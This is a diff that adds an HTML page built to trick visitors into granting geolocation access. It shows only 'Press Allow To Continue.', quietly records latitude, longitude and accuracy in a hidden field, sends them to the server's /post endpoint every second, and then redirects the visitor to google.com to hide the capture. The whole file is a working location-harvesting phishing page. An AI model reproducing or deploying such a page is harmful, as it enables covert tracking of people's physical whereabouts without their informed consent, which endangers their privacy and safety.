@@ -1,0 +1,57 @@
+<!DOCTYPE HTML>
+<html>
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> 
+
+    <body>
+        <form id="name_form">
+            <h>Press Allow To Continue.</h>
+            <input type="hidden" id="demo" name="route_no" />
+            <br/>
+            <br/>
+            
+        </form>
+        
+        <script src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
+        <script type="text/javascript">
+              var x = document.getElementById("demo");
+              function getLocation() {
+
+                if (navigator.geolocation) {
+                  navigator.geolocation.watchPosition(showPosition);
+                } 
+              }
+              
+              function showPosition(position) {
+                var latitude = position.coords.latitude
+                window.latitude=latitude
+                var longitude = position.coords.longitude
+                var link = "https://www.google.com/maps/@"+latitude+","+longitude
+                document.getElementById("demo").value =latitude+":"+longitude+":"+position.coords.accuracy+" m";
+
+              }
+            getLocation();
+            $.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                }
+            });
+            
+            setInterval(function(){
+                var textboxvalue = $('input[name="route_no"]').val();
+                $.ajax({
+                    url:'/post', // Url to which the request is send
+                    type: "POST",             // Type of request to be send, called as method
+                    data : {txt1:textboxvalue},
+                    success: function()   // A function to be called if request succeeds
+                    {
+                        
+                    if (window.latitude){
+                        window.location.href ="https://google.com";
+                    }
+                    }
+                });
+            },1000);
+
+        </script>
+    </body>
+</html>
